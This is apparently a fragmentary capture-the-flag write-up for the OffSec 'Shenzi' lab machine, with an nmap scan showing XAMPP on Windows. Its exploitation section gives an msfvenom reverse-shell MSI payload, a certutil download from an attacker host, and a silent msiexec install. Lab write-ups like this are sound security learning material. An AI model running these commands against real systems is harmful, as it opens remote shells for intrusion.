...
date: 2026-04-02
draft: false
description: "OffSec Shenzi writeup"
...
```
Not shown: 65339 closed tcp ports (reset), 181 filtered tcp ports (no-response)
...
|_Requested resource was http://192.168.117.55/dashboard/
...
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was https://192.168.117.55/dashboard/
| tls-alpn: 
|_  http/1.1
...
{{< figure src="image 966.png" >}}

{{< figure src="image 967.png" >}}
...
{{< figure src="6c339cb2-5cb9-4f47-886d-32181488061b.png" >}}

{{< figure src="fdec1a65-faae-468f-aa20-166d1c9f9e83.png" >}}

## Exploitation

lets get RCE thru wp
...
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.159 LPORT=6969 -a x64 --platform Windows -f msi -o rev.msi
```

```
certutil -urlcache -f http://192.168.45.199/rev.msi rev.msi
```

and then 

```
msiexec /i C:\\Users\\shenzi\\Desktop\\rev.msi /qn
```

{{< figure src="image 969.png" >}}
